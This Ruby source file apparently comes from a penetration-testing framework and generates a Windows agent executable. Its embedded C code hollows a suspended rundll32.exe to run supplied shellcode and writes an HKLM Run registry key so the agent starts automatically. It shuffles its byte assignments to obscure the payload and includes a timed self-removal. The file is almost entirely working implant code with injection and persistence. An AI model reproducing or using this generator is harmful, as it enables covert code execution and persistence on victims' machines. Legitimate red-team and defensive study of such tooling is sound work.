module Pro
module Agent
class Win32 < BaseAgent

	def self.generate(framework, code, opts={})

		seq  = []

		buff = code
		idx  = 0;
		buff.unpack("C*").each do |c|
			seq << "code[#{idx}] = #{c};"
			idx += 1
		end

		pname = "rundll32.exe\x00"
		idx   = 0;
		pname.unpack("C*").each do |c|
			seq << "pname[#{idx}] = #{c};"
			idx += 1
		end

		rpath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\x00"
		idx   = 0;
		rpath.unpack("C*").each do |c|
			seq << "rpath[#{idx}] = #{c};"
			idx += 1
		end

		scrabble = Rex::Text.shuffle_a(seq).join("\n")

		agent_uuid  = opts[:agent_uuid]  || Rex::Text.rand_text_alpha( rand(8) + 8 )
		expire_time = opts[:expire_time] || ::Time.at(::Time.now.to_i + ( 3600 * 24 )).utc.to_i
		t64 = (expire_time + 11644473600) * 10000000
		expire_hi = (t64 & 0xffffffff00000000) >> 32
		expire_lo = (t64 & 0x00000000ffffffff)

agent_wrapper = <<EOS

#define NULL 0
struct _RTL_CRITICAL_SECTION;
typedef int BOOL;
typedef unsigned char BYTE;
typedef char CHAR;
typedef unsigned long DWORD;
typedef __stdcall int (*FARPROC)();
typedef float FLOAT;
typedef long FXPT2DOT30;
typedef void *HANDLE;
typedef short SHORT;
typedef int INT;
typedef int INT_PTR;
typedef long LONG;
typedef __int64 LONGLONG;
typedef long LONG_PTR;
typedef unsigned char UCHAR;
typedef unsigned int UINT;
typedef unsigned int UINT_PTR;
typedef unsigned long ULONG;
typedef unsigned __int64 ULONGLONG;
typedef unsigned long ULONG_PTR;
typedef unsigned short USHORT;
typedef unsigned short WORD;
typedef BOOL *LPBOOL;
typedef BYTE *LPBYTE;
typedef const CHAR *LPCCH;
typedef CHAR *LPCH;
typedef const CHAR *LPCSTR;
typedef DWORD *LPDWORD;
typedef HANDLE *LPHANDLE;
typedef CHAR *LPSTR;
typedef WORD *LPWORD;
typedef LONG_PTR LRESULT;
typedef LONG LSTATUS;
typedef LONG NTSTATUS;
typedef unsigned int size_t;
typedef const char *PCSZ;
typedef unsigned int *PUINT;
typedef unsigned long *PULONG_PTR;
typedef void *PVOID;

#define CREATE_SUSPENDED		0x00000004
#define IDLE_PRIORITY_CLASS		0x00000040

#define SIZE_OF_80387_REGISTERS	80
#define CONTEXT_i386	0x10000
#define CONTEXT_i486	0x10000
#define CONTEXT_CONTROL	(CONTEXT_i386|0x00000001L)
#define CONTEXT_INTEGER	(CONTEXT_i386|0x00000002L)
#define CONTEXT_SEGMENTS	(CONTEXT_i386|0x00000004L)
#define CONTEXT_FLOATING_POINT	(CONTEXT_i386|0x00000008L)
#define CONTEXT_DEBUG_REGISTERS	(CONTEXT_i386|0x00000010L)
#define CONTEXT_EXTENDED_REGISTERS (CONTEXT_i386|0x00000020L)
#define CONTEXT_FULL	(CONTEXT_CONTROL|CONTEXT_INTEGER|CONTEXT_SEGMENTS)
#define MAXIMUM_SUPPORTED_EXTENSION  512

#define PAGE_NOACCESS	0x0001
#define PAGE_READONLY	0x0002
#define PAGE_READWRITE	0x0004
#define PAGE_WRITECOPY	0x0008
#define PAGE_EXECUTE	0x0010
#define PAGE_EXECUTE_READ	0x0020
#define PAGE_EXECUTE_READWRITE	0x0040
#define PAGE_EXECUTE_WRITECOPY	0x0080
#define PAGE_GUARD		0x0100
#define PAGE_NOCACHE		0x0200

#define MEM_COMMIT           0x1000
#define MEM_RESERVE          0x2000
#define MEM_DECOMMIT         0x4000
#define MEM_RELEASE          0x8000
#define MEM_FREE            0x10000
#define MEM_PRIVATE         0x20000
#define MEM_MAPPED          0x40000
#define MEM_RESET           0x80000
#define MEM_TOP_DOWN       0x100000
#define MEM_WRITE_WATCH	   0x200000 /* 98/Me */
#define MEM_PHYSICAL	   0x400000
#define MEM_4MB_PAGES    0x80000000

#define KEY_READ 0x20019
#define KEY_WRITE 0x20006
#define HKEY_LOCAL_MACHINE 0x80000002
#define REG_SZ 1

#define ERROR_ALREADY_EXISTS 183
#define TRUE 1
#define FALSE 0

#define ERROR_SUCCESS 0


struct _PROCESS_INFORMATION {
	HANDLE hProcess;
	HANDLE hThread;
	DWORD dwProcessId;
	DWORD dwThreadId;
};

struct _STARTUPINFOA {
	DWORD cb;
	LPSTR lpReserved;
	LPSTR lpDesktop;
	LPSTR lpTitle;
	DWORD dwX;
	DWORD dwY;
	DWORD dwXSize;
	DWORD dwYSize;
	DWORD dwXCountChars;
	DWORD dwYCountChars;
	DWORD dwFillAttribute;
	DWORD dwFlags;
	WORD wShowWindow;
	WORD cbReserved2;
	LPBYTE lpReserved2;
	HANDLE hStdInput;
	HANDLE hStdOutput;
	HANDLE hStdError;
};

struct _FLOATING_SAVE_AREA {
	DWORD ControlWord;
	DWORD StatusWord;
	DWORD TagWord;
	DWORD ErrorOffset;
	DWORD ErrorSelector;
	DWORD DataOffset;
	DWORD DataSelector;
	BYTE RegisterArea[80];
	DWORD Cr0NpxState;
};

struct _CONTEXT {
	DWORD ContextFlags;
	DWORD Dr0;
	DWORD Dr1;
	DWORD Dr2;
	DWORD Dr3;
	DWORD Dr6;
	DWORD Dr7;
	struct _FLOATING_SAVE_AREA FloatSave;
	DWORD SegGs;
	DWORD SegFs;
	DWORD SegEs;
	DWORD SegDs;
	DWORD Edi;
	DWORD Esi;
	DWORD Ebx;
	DWORD Edx;
	DWORD Ecx;
	DWORD Eax;
	DWORD Ebp;
	DWORD Eip;
	DWORD SegCs;
	DWORD EFlags;
	DWORD Esp;
	DWORD SegSs;
	BYTE ExtendedRegisters[512];
} __attribute__((pack(8)));

struct _FILETIME {
	DWORD dwLowDateTime;
	DWORD dwHighDateTime;
};

struct HKEY__ {
	int unused;
};
typedef struct HKEY__ *HKEY;
typedef HKEY *PHKEY;

__stdcall void * ExitProcess __attribute__((dllimport))(void * var80 );
__stdcall void * CloseHandle __attribute__((dllimport))(void * var40 );
__stdcall void * TerminateProcess __attribute__((dllimport))(void * var355 , void * var356 );
__stdcall void * ResumeThread __attribute__((dllimport))(void * var263 );
__stdcall void * WaitForSingleObject __attribute__((dllimport))(void * var392 , void * var393 );
__stdcall void * SetThreadContext __attribute__((dllimport))(void * var5205 , void * var5206 );
__stdcall void * WriteProcessMemory __attribute__((dllimport))(void * var2344 , void * var2345 , void * var2346 , void * var2347 , void * var2348 );
__stdcall void * VirtualAllocEx __attribute__((dllimport))(void * var2289 , void * var2290 , void * var2291 , void * var2292 , void * var2293 );
__stdcall void * GetThreadContext __attribute__((dllimport))(void * var5329 , void * var5330 );
__stdcall void * CreateProcessA __attribute__((dllimport))(void * var4429 , void * var4430 , void * var4431 , void * var4432 , void * var4433 , void * var4434 , void * var4435 , void * var4436 , void * var4437 , void * var4438 );

__cdecl void *memset(void *, int, size_t);
__cdecl size_t strlen(const char *);

__stdcall void * GetSystemTimeAsFileTime __attribute__((dllimport))(void * var3349 );

__stdcall void * RegOpenKeyExA __attribute__((dllimport))(void * var3904 , void * var3905 , void * var3906 , void * var3907 , void * var3908 );
__stdcall void * RegSetValueExA __attribute__((dllimport))(void * var1871 , void * var1872 , void * var1873 , void * var1874 , void * var1875 , void * var1876 );
__stdcall void * RegCloseKey __attribute__((dllimport))(void * var1813 );
__stdcall void * RegDeleteValueA __attribute__((dllimport))(void * var1816 , void * var1817 );
__stdcall void * RegSetValueExA __attribute__((dllimport))(void * var1871 , void * var1872 , void * var1873 , void * var1874 , void * var1875 , void * var1876 );

__stdcall void * GetModuleHandleA __attribute__((dllimport))(void * var3248 );
__stdcall void * GetModuleFileNameA __attribute__((dllimport))(void * var3242 , void * var3243 , void * var3244 );
__stdcall void * Sleep __attribute__((dllimport))(void * var338 );

__stdcall void * CreateMutexA __attribute__((dllimport))(void * var2657 , void * var2658 , void * var2659 );
__stdcall void * GetLastError __attribute__((dllimport))(void);


__stdcall void * MessageBoxA __attribute__((dllimport))(void * var1622 , void * var1623 , void * var1624 , void * var1625 );




unsigned char pname[#{pname.length + rand(128)}];
unsigned char rpath[#{rpath.length + rand(128)}];
unsigned char code[#{code.length + rand(128)}];

char *uuidk = "#{agent_uuid}";
struct _FILETIME exp;

int expired(void) {
	struct _FILETIME now;
	HKEY reg;

	GetSystemTimeAsFileTime(&now);
	if (now.dwHighDateTime > exp.dwHighDateTime || (now.dwHighDateTime == exp.dwHighDateTime && now.dwLowDateTime >= now.dwLowDateTime)) {
		// The expiration date has been reached, uninstall the application
		if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, rpath, 0, KEY_READ|KEY_WRITE, &reg) == ERROR_SUCCESS) {
			RegDeleteValueA(reg, uuidk);
		}
		return(1);
	}
	return(0);
}

void main(void)
{
	int error;
	int ep;
	int ret;
	unsigned char name[1024];

	struct _PROCESS_INFORMATION pi;
	struct _STARTUPINFOA si;
	struct _CONTEXT ctx;
	HANDLE self;
	HANDLE mute;
	HKEY reg;

	mute = CreateMutexA(NULL, TRUE, uuidk);
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		ExitProcess(0);
	}

	exp.dwLowDateTime  = #{expire_lo};
	exp.dwHighDateTime = #{expire_hi};

	GetModuleFileNameA(GetModuleHandleA(NULL), name, sizeof(name));

	#{scrabble}

	while(1) {

		if (expired() == 1) {
			ExitProcess(0);
		}

		// Write our autoloader key to the registry
		if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, rpath, 0, KEY_WRITE, &reg) == ERROR_SUCCESS) {
			RegSetValueExA(reg, uuidk, 0, REG_SZ, name, strlen(name)+1);
			RegCloseKey(reg);
		}

		memset( &pi, 0, sizeof( pi ));
		memset( &si, 0, sizeof( si ));
		si.cb = sizeof(si);

		if(CreateProcessA( 0, pname, 0, 0, 0, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, 0, 0, &si, &pi)) {

			ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;

			GetThreadContext(pi.hThread, &ctx);

			ep = VirtualAllocEx(pi.hProcess, NULL, #{ (1024*1024) + rand(256) * 1024 }, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

			WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, sizeof(code), 0);

			ctx.Eip = ep;

	        SetThreadContext(pi.hThread, &ctx);

	        ResumeThread(pi.hThread);

			while ((ret = WaitForSingleObject(pi.hThread, 1000))) {

				if (expired()) {
					CloseHandle(pi.hThread);
					CloseHandle(pi.hProcess);
					TerminateProcess(pi.hProcess, 0);
					ExitProcess(0);
				}

				if (ret != 0x102) break;
			}

			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			TerminateProcess(pi.hProcess, 0);
		} else {
			// Not much we can do here but give up and exit
			break;
		}

		Sleep(5000);
	}

	ExitProcess(0);

}
EOS
		cpu = Metasm::Ia32.new
		pe  = Metasm::PE.compile_c(cpu, agent_wrapper)
		pe.encode_string
	end


end
end
end

